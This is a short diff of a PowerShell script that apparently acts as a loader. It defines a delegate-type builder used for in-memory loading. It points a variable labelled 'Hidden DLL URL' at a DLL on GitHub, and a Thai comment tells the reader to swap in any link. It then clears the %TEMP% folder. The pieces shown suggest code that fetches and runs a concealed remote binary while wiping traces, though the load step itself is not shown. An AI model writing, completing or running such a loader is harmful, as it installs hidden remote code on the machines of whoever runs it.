@@ -62,7 +62,7 @@ function getDelegateType {
     return $type.CreateType()
 }
 # === Hidden DLL URL (เปลี่ยนลิงก์ให้เป็นลิงก์ที่ต้องการ) ===
-$dllUrl = "https://raw.githubusercontent.com/novaxstorex/Nova/refs/heads/main/Nova.ps1"
+$dllUrl = "https://github.com/novaxstorex/Nova/blob/main/Nova.dll"
 
 # === 1. Clear Temp Folder ===
 Write-Host "[+] Clearing %TEMP% folder..." -ForegroundColor Cyan
